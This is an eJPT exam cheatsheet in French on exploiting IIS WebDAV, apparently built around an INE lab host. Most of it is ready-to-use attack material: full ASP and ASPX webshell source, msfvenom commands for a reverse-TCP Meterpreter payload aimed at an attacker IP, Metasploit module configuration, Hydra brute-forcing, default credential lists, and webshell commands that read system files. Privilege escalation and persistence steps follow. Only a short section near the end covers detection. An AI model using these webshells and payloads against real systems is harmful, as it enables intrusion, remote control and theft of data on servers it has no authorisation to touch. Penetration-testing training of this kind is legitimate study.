# üåê IIS WebDAV Exploitation - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de WebDAV

### Qu'est-ce que WebDAV ?
**WebDAV** (Web Distributed Authoring and Versioning) est une extension HTTP qui permet :
- üì§ **Upload de fichiers** via HTTP
- üìù **Cr√©ation/modification** de contenu web √† distance
- üîí **Gestion des verrous** sur les fichiers
- üìÅ **Navigation** dans l'arborescence comme un filesystem

### Vuln√©rabilit√©s communes WebDAV
- ‚úÖ **Authentification faible** ou par d√©faut
- ‚úÖ **Upload de shells web** malveillants
- ‚úÖ **Permissions mal configur√©es**
- ‚úÖ **Extensions dangereuses** autoris√©es (.asp, .aspx, .php)
- ‚úÖ **Pas de validation** des fichiers upload√©s

### Ports et services associ√©s
| Service | Port | Description |
|---------|------|-------------|
| **HTTP** | 80 | WebDAV via HTTP |
| **HTTPS** | 443 | WebDAV via HTTPS |
| **WebDAV** | 8080 | Port alternatif WebDAV |

---

## üîç 2. Reconnaissance et d√©couverte

### Scan Nmap basique
```bash
# Discovery des ports
nmap demo.ine.local
nmap -p80,443,8080 demo.ine.local

# Scan avec d√©tection de version
nmap -sV -p 80 demo.ine.local
```

### √ânum√©ration HTTP/WebDAV
```bash
# Script http-enum pour d√©couvrir r√©pertoires
nmap --script http-enum -sV -p 80 demo.ine.local

# Scripts WebDAV sp√©cifiques
nmap --script http-webdav-scan -p 80 demo.ine.local
nmap --script http-methods -p 80 demo.ine.local

# V√©rifier m√©thodes HTTP autoris√©es
curl -X OPTIONS http://demo.ine.local/webdav
curl -I http://demo.ine.local/webdav
```

### Identification WebDAV
```bash
# Headers r√©v√©lateurs WebDAV
curl -I http://demo.ine.local/webdav
# Rechercher: Server, DAV, MS-Author-Via

# Test d'acc√®s WebDAV
curl http://demo.ine.local/webdav
curl http://demo.ine.local/webdav/

# R√©ponses typiques :
# 401 Unauthorized = Auth requise
# 403 Forbidden = Pas d'acc√®s
# 200 OK = Acc√®s libre
```

---

## üõ†Ô∏è 3. Outils de test WebDAV

### davtest (Test automatis√©)
```bash
# Test sans authentification
davtest -url http://demo.ine.local/webdav

# Test avec authentification
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Options avanc√©es
davtest -auth user:pass -url http://target/webdav -directory testdir
davtest -auth user:pass -url http://target/webdav -sendbd auto
```

### Interpr√©tation r√©sultats davtest
```bash
# Sortie typique :
# SUCCEED: .txt (upload + execute)
# SUCCEED: .html (upload + execute)  
# SUCCEED: .asp (upload + execute)   # ‚Üê CRITIQUE pour IIS
# SUCCEED: .aspx (upload + execute)  # ‚Üê CRITIQUE pour IIS
# FAIL: .php (upload only)
# FAIL: .jsp (forbidden)

# Extensions critiques IIS :
# .asp, .aspx = Ex√©cution c√¥t√© serveur
# .html, .txt = Upload possible mais pas RCE direct
```

### cadaver (Client WebDAV interactif)
```bash
# Connexion WebDAV
cadaver http://demo.ine.local/webdav

# Authentification quand demand√©e
Username: bob
Password: password_123321

# Commandes dans cadaver
ls                                    # Lister fichiers
pwd                                   # R√©pertoire actuel
cd directory                         # Changer r√©pertoire
get filename                         # T√©l√©charger fichier
put /local/file                      # Uploader fichier
mput *.asp                           # Upload multiple
delete filename                      # Supprimer fichier
mkdir dirname                        # Cr√©er r√©pertoire
quit                                 # Quitter
```

---

## üîß 4. Exploitation WebDAV

### Phase 1: D√©couverte et test d'acc√®s
```bash
# 1. Scan initial
nmap --script http-enum -sV -p 80 demo.ine.local

# 2. Test davtest sans auth
davtest -url http://demo.ine.local/webdav
# R√©sultat : 401 Unauthorized

# 3. Test avec credentials (si connus)
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

### Phase 2: Upload de webshell
```bash
# 1. Connexion cadaver
cadaver http://demo.ine.local/webdav
# Username: bob
# Password: password_123321

# 2. Upload webshell ASP
put /usr/share/webshells/asp/webshell.asp
ls                                   # V√©rifier upload

# 3. Alternative : upload custom shell
put /path/to/custom_shell.asp
put /path/to/shell.aspx
```

### Phase 3: Acc√®s et ex√©cution
```bash
# 1. Acc√®s via navigateur
firefox http://demo.ine.local/webdav/webshell.asp

# 2. Test RCE via URL
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir"

# 3. Commands avec URL encoding
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C"
# %3A = :
# %5C = \
```

---

## üöÄ 6. Exploitation avec Metasploit Framework

### Module IIS WebDAV Upload ASP
| Param√®tre | Valeur |
|-----------|--------|
| **Module** | `exploit/windows/iis/iis_webdav_upload_asp` |
| **Cible** | IIS 5.0/6.0 avec WebDAV activ√© |
| **Payload** | windows/meterpreter/reverse_tcp (d√©faut) |
| **Pr√©requis** | Credentials WebDAV valides |
| **Action** | Upload automatique shell ASP + ex√©cution |

### Configuration et ex√©cution Metasploit
```bash
# 1. Lancer Metasploit
msfconsole -q

# 2. Utiliser le module WebDAV
use exploit/windows/iis/iis_webdav_upload_asp
show options

# 3. Configuration obligatoire
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp

# 4. Configuration payload (optionnel)
set LHOST your_kali_ip                  # IP attaquant
set LPORT 4444                          # Port d'√©coute

# 5. V√©rifier configuration
show options

# 6. Lancer l'exploitation
exploit
```

### Options du module d√©taill√©es
| Option | Description | Valeur exemple |
|--------|-------------|----------------|
| `RHOSTS` | IP cible | demo.ine.local |
| `RPORT` | Port cible | 80 (d√©faut) |
| `HttpUsername` | User WebDAV | bob |
| `HttpPassword` | Password WebDAV | password_123321 |
| `PATH` | Chemin upload | /webdav/shell%RAND%.asp |
| `METHOD` | M√©thode upload | move (d√©faut) |
| `LHOST` | IP attaquant | your_kali_ip |
| `LPORT` | Port √©coute | 4444 |

### Workflow Metasploit complet
```bash
# Phase 1: D√©couverte (comme avant)
nmap --script http-enum -sV -p 80 demo.ine.local
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Phase 2: Exploitation Metasploit
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
set LHOST your_kali_ip
exploit

# Phase 3: Post-exploitation via Meterpreter
# Session Meterpreter obtenue automatiquement
sysinfo
getuid
shell                                   # Passer en shell Windows
```

### Avantages du module Metasploit
- ‚úÖ **Automatisation compl√®te** : Upload + ex√©cution en une commande
- ‚úÖ **Session Meterpreter** : Acc√®s post-exploitation avanc√©
- ‚úÖ **Gestion des erreurs** : Retry automatique si √©chec
- ‚úÖ **Noms al√©atoires** : %RAND% √©vite d√©tection
- ‚úÖ **Nettoyage auto** : Suppression du shell apr√®s usage

---

## üîß 7. Comparaison m√©thodes d'exploitation

### M√©thode manuelle vs Metasploit
| Aspect | M√©thode manuelle | Metasploit |
|--------|------------------|------------|
| **Outils** | davtest + cadaver + curl | Module MSF |
| **Complexit√©** | Plusieurs √©tapes | Une commande |
| **Shell obtenu** | Webshell HTTP | Meterpreter |
| **Fonctionnalit√©s** | Limit√©es (HTTP) | Compl√®tes (TCP) |
| **Stealth** | Plus discret | Plus d√©tectable |
| **Debugging** | Manuel | Automatique |

### Quand utiliser chaque m√©thode ?
**M√©thode manuelle :**
- üéØ **Reconnaissance** approfondie des capabilities
- üéØ **Stealth** maximum requis
- üéØ **Webshell simple** suffisant
- üéØ **Debugging** des permissions WebDAV

**Metasploit :**
- üéØ **Exploitation rapide** pour eJPT
- üéØ **Post-exploitation** avanc√©e n√©cessaire
- üéØ **Session stable** requise
- üéØ **Automatisation** pr√©f√©r√©e

---

## üîç 8. Post-exploitation avec session Meterpreter

### Commandes Meterpreter WebDAV
```bash
# Informations syst√®me
sysinfo
getuid                                  # IIS APPPOOL\DefaultAppPool
getpid
ps

# Navigation syst√®me
shell                                   # Passer en shell Windows
cd /                                    # ou cd C:\
dir                                     # Lister r√©pertoire racine
type flag.txt                          # Lire fichier flag

# Retour Meterpreter
exit                                    # Quitter shell ‚Üí retour Meterpreter
```

### √ânum√©ration avanc√©e Meterpreter
```bash
# Dans session Meterpreter
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/multi/recon/local_exploit_suggester

# Escalation de privil√®ges
getsystem                              # Tentative auto-escalation
run post/windows/escalate/getsystem    # Alternative
```

### Migration et stabilisation
```bash
# Migration vers processus plus stable
ps                                     # Lister processus
migrate <pid_explorer>                 # Migrer vers explorer.exe
migrate <pid_winlogon>                 # Ou vers winlogon.exe
```

---

## üõ†Ô∏è 9. Exploitation alternative avec dirb

### Si http-enum lent ou ne fonctionne pas
```bash
# Alternative √† nmap --script http-enum
dirb http://demo.ine.local

# Dirb avec wordlist sp√©cialis√©e
dirb http://demo.ine.local /usr/share/wordlists/dirb/common.txt

# Recherche sp√©cifique WebDAV
dirb http://demo.ine.local -w

# Avec extensions
dirb http://demo.ine.local -X .asp,.aspx,.php
```

### R√©sultat dirb typique
```bash
# Sortie attendue :
+ http://demo.ine.local/webdav/ (CODE:401|SIZE:1293)
+ http://demo.ine.local/_vti_bin/ (CODE:200|SIZE:195)
+ http://demo.ine.local/images/ (CODE:403|SIZE:1233)

# CODE:401 = Authentification requise (WebDAV!)
# CODE:403 = Acc√®s interdit
# CODE:200 = Acc√®s libre
```

---

## üéØ 10. Workflow complet eJPT avec Metasploit

### Sc√©nario 1: WebDAV ‚Üí Metasploit direct
```bash
# 1. D√©couverte rapide
nmap --script http-enum -sV -p 80 demo.ine.local

# 2. Test credentials (si connus de l'√©nonc√©)
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# 3. Exploitation Metasploit
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
set LHOST your_kali_ip
exploit

# 4. Post-exploitation
shell
cd /
type flag.txt
```

### Sc√©nario 2: Brute force ‚Üí Metasploit
```bash
# 1. Si credentials inconnus
hydra -L users.txt -P passwords.txt http-get://demo.ine.local/webdav

# 2. Une fois credentials trouv√©s
use exploit/windows/iis/iis_webdav_upload_asp
set HttpUsername found_user
set HttpPassword found_pass
# ... reste identique
```

### Sc√©nario 3: Fallback m√©thode manuelle
```bash
# Si module Metasploit √©choue
cadaver http://demo.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
# Puis RCE via curl comme m√©thode manuelle
```

---

## üîß 11. Troubleshooting Metasploit WebDAV

### Erreurs communes et solutions
| Erreur | Cause | Solution |
|--------|-------|----------|
| **No session created** | Credentials incorrects | V√©rifier HttpUsername/HttpPassword |
| **Upload failed** | PATH incorrect | Ajuster PATH (/webdav/) |
| **Connection timeout** | Firewall/r√©seau | V√©rifier LHOST/LPORT |
| **Permission denied** | Pas de droits upload | Tester avec davtest d'abord |

### Debug du module
```bash
# Mode verbose
set VERBOSE true
exploit

# V√©rifier options
show options
show advanced

# Test manuel apr√®s √©chec MSF
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

### Variantes du chemin PATH
```bash
# Diff√©rentes variantes √† tester
set PATH /webdav/shell%RAND%.asp
set PATH /webdav/test%RAND%.asp  
set PATH /WebDAV/shell%RAND%.asp         # Casse diff√©rente
set PATH webdav/shell%RAND%.asp          # Sans / initial
```

---

### Webshells ASP natifs Kali
```bash
# Localisation webshells Kali
ls /usr/share/webshells/asp/
ls /usr/share/webshells/aspx/

# Principaux webshells
/usr/share/webshells/asp/webshell.asp          # Simple command execution
/usr/share/webshells/asp/cmd.asp               # Basic cmd shell
/usr/share/webshells/aspx/cmdasp.aspx          # ASPX version
```

### Webshell ASP custom simple
```asp
<%
Set cmd = CreateObject("WScript.Shell")
Set exec = cmd.Exec(Request.QueryString("cmd"))
Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
%>
```

### Webshell ASPX custom
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

### Meterpreter ASP payload
```bash
# G√©n√©rer payload Meterpreter ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp > meterpreter.asp

# Upload via cadaver
cadaver http://target/webdav
put meterpreter.asp

# Handler Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# D√©clencher payload
curl http://target/webdav/meterpreter.asp
```

---

## üîê 6. Techniques d'authentification

### Brute force WebDAV avec Hydra
```bash
# Brute force HTTP Basic Auth
hydra -L users.txt -P passwords.txt http-get://demo.ine.local/webdav

# Avec utilisateur connu
hydra -l bob -P passwords.txt http-get://demo.ine.local/webdav

# Options recommand√©es
hydra -L users.txt -P passwords.txt -t 16 -f http-get://demo.ine.local/webdav
```

### Credentials par d√©faut IIS/WebDAV
```bash
# Credentials courants √† tester
admin:admin
administrator:password
bob:password
iis:iis
webdav:webdav
guest:guest
test:test
user:password
```

### Test manuel d'authentification
```bash
# Avec curl
curl -u bob:password_123321 http://demo.ine.local/webdav

# Test diff√©rents utilisateurs
for user in admin administrator bob guest; do
    curl -u $user:password http://demo.ine.local/webdav 2>/dev/null | grep -q "200 OK" && echo "SUCCESS: $user:password"
done
```

---

## üìã 7. Commandes post-exploitation

### √ânum√©ration syst√®me via webshell
```bash
# Informations syst√®me
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=hostname"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=systeminfo"

# Exploration filesystem
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+%22C%3A%5CProgram+Files%22"

# Utilisateurs et groupes
curl "http://demo.ine.local/webdav/webshell.asp?cmd=net+user"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=net+localgroup+administrators"

# Processus et services
curl "http://demo.ine.local/webdav/webshell.asp?cmd=tasklist"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=sc+query"
```

### Lecture de fichiers sensibles
```bash
# Lecture flag (exemple eJPT)
curl "http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt"

# Fichiers syst√®me Windows
curl "http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cboot.ini"

# Logs IIS
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5Cinetpub%5Clogs"
```

### Download de fichiers
```bash
# Via cadaver
cadaver http://demo.ine.local/webdav
get sensitive_file.txt
get config.xml

# Via curl (si webshell permet lecture)
curl "http://demo.ine.local/webdav/webshell.asp?cmd=type+sensitive_file.txt" > downloaded_file.txt
```

---

## üéØ 13. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: WebDAV avec auth faible
```bash
# 1. D√©couverte WebDAV
nmap --script http-enum -p 80 target

# 2. Test credentials par d√©faut
davtest -auth bob:password_123321 -url http://target/webdav

# 3. Upload webshell
cadaver http://target/webdav
put /usr/share/webshells/asp/webshell.asp

# 4. RCE
curl "http://target/webdav/webshell.asp?cmd=whoami"
```

### Sc√©nario 2: WebDAV ‚Üí Meterpreter
```bash
# 1. G√©n√©rer payload ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f asp > met.asp

# 2. Upload payload
cadaver http://target/webdav
put met.asp

# 3. Handler Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker; set LPORT 4444; exploit

# 4. Trigger payload
curl http://target/webdav/met.asp
```

### Sc√©nario 3: WebDAV sans credentials
```bash
# 1. Test acc√®s libre
davtest -url http://target/webdav

# 2. Si acc√®s libre ‚Üí Upload direct
cadaver http://target/webdav
put shell.asp

# 3. Exploitation
curl "http://target/webdav/shell.asp?cmd=whoami"
```

---

## üí° 14. Conseils et astuces eJPT

### Points critiques WebDAV eJPT
- ‚úÖ **Module Metasploit** = Exploitation automatis√©e rapide
- ‚úÖ **Extensions ASP/ASPX** = RCE direct sur IIS
- ‚úÖ **davtest** r√©v√®le capabilities upload/execute
- ‚úÖ **cadaver** = client interactif parfait
- ‚úÖ **Credentials faibles** tr√®s fr√©quents
- ‚úÖ **dirb alternative** si http-enum lent

### Erreurs courantes √† √©viter
- ‚ùå **Oublier URL encoding** dans les commandes
- ‚ùå **Ignorer extensions** autoris√©es par davtest
- ‚ùå **Ne pas tester credentials** par d√©faut
- ‚ùå **Upload sans test** d'ex√©cution
- ‚ùå **Webshell dans mauvais** r√©pertoire

### Extensions critiques par serveur
| Serveur | Extensions RCE |
|---------|----------------|
| **IIS** | .asp, .aspx |
| **Apache** | .php, .pl, .py |
| **Tomcat** | .jsp, .jspx |
| **Generic** | .cgi |

### URL Encoding essentiel
```bash
# Caract√®res √† encoder
espace = +  ou  %20
:      = %3A
\      = %5C
/      = %2F
"      = %22

# Exemples
dir C:\        ‚Üí dir+C%3A%5C
type "file"    ‚Üí type+%22file%22
cd "Program Files" ‚Üí cd+%22Program+Files%22
```

### One-liners WebDAV
```bash
# Test rapide WebDAV + upload
davtest -auth bob:password -url http://target/webdav && echo "put /usr/share/webshells/asp/webshell.asp" | cadaver http://target/webdav

# RCE test rapide
curl "http://target/webdav/webshell.asp?cmd=whoami"

# Enum√©ration rapide post-RCE
for cmd in whoami hostname "dir C%3A%5C"; do echo "=== $cmd ==="; curl -s "http://target/webdav/webshell.asp?cmd=$cmd"; done
```

---

## üõ°Ô∏è 15. D√©tection et contre-mesures

### D√©tection c√¥t√© d√©fenseur
```powershell
# V√©rifier uploads WebDAV
Get-ChildItem C:\inetpub\wwwroot\webdav\ -Recurse

# Logs IIS d'activit√© WebDAV
Get-EventLog -LogName System | Where-Object {$_.Source -eq "Microsoft-Windows-IIS-W3SVC"}

# Processus suspects depuis IIS
Get-Process | Where-Object {$_.ProcessName -like "*w3wp*"}
```

### Nettoyage des artefacts
```bash
# Supprimer webshells upload√©s
cadaver http://target/webdav
delete webshell.asp
delete meterpreter.asp

# Via RCE si toujours actif
curl "http://target/webdav/webshell.asp?cmd=del+C%3A%5Cinetpub%5Cwwwroot%5Cwebdav%5Cwebshell.asp"
```

---

## üìã 16. Checklist exploitation WebDAV

### ‚úÖ Phase de reconnaissance
- [ ] **Port 80/443** ouvert et IIS d√©tect√©
- [ ] **R√©pertoire /webdav** d√©couvert
- [ ] **M√©thodes HTTP** autoris√©es identifi√©es
- [ ] **Type d'authentification** d√©termin√©

### ‚úÖ Phase d'exploitation
- [ ] **davtest** ex√©cut√© avec succ√®s
- [ ] **Extensions ex√©cutables** identifi√©es (.asp/.aspx)
- [ ] **Credentials** trouv√©s ou bruteforc√©s
- [ ] **M√©thode choisie** : Metasploit ou manuelle
- [ ] **Module MSF configur√©** si Metasploit utilis√©
- [ ] **Webshell** upload√© avec succ√®s (si manuel)
- [ ] **Session Meterpreter** obtenue (si MSF)
- [ ] **RCE** confirm√© via webshell ou session

### ‚úÖ Phase post-exploitation
- [ ] **Identit√©** du processus d√©termin√©e (IIS AppPool)
- [ ] **Syst√®me** √©num√©r√© (OS, users, services)
- [ ] **Fichiers sensibles** localis√©s et lus
- [ ] **Persistence** install√©e si n√©cessaire
- [ ] **Artefacts** nettoy√©s

**üéØ Conseil final eJPT :** WebDAV est une **porte d'entr√©e classique** dans l'eJPT. Le **module Metasploit** `exploit/windows/iis/iis_webdav_upload_asp` est la m√©thode la plus rapide et efficace. Alternative : davtest ‚Üí cadaver ‚Üí webshell ASP. Toujours tester credentials par d√©faut (bob:password_123321) en premier !